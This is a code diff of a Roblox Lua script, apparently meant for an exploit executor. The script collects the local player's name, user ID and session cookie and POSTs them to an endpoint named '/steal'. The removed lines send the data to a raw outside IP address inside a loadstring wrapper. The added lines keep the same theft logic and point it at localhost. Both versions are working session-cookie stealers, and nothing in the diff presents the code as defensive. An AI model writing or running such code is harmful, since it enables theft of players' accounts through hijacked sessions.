@@ -1,27 +1,25 @@
-loadstring([[
-    local http = game:GetService("HttpService")
-    local player = game.Players.LocalPlayer
-    
-    local cookie = ""
-    if syn and syn.cookie then
-        cookie = syn.cookie()
-    elseif getcookie then
-        cookie = getcookie()
-    end
-    
-    local data = {
-        user = player.Name,
-        userId = player.UserId,
-        cookie = cookie,
-        time = os.time()
-    }
-    
-    syn.request({
-        Url = "http://138.84.114.169:8080/steal",
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = http:JSONEncode(data)
-    })
-    
-    print("Sent to server")
-]])()
+local http = game:GetService("HttpService")
+local player = game.Players.LocalPlayer
+
+local cookie = ""
+if syn and syn.cookie then
+    cookie = syn.cookie()
+elseif getcookie then
+    cookie = getcookie()
+end
+
+local data = {
+    user = player.Name,
+    userId = player.UserId,
+    cookie = cookie,
+    time = os.time()
+}
+
+syn.request({
+    Url = "http://localhost:8080/steal",
+    Method = "POST",
+    Headers = {["Content-Type"] = "application/json"},
+    Body = http:JSONEncode(data)
+})
+
+print("Sent to server")
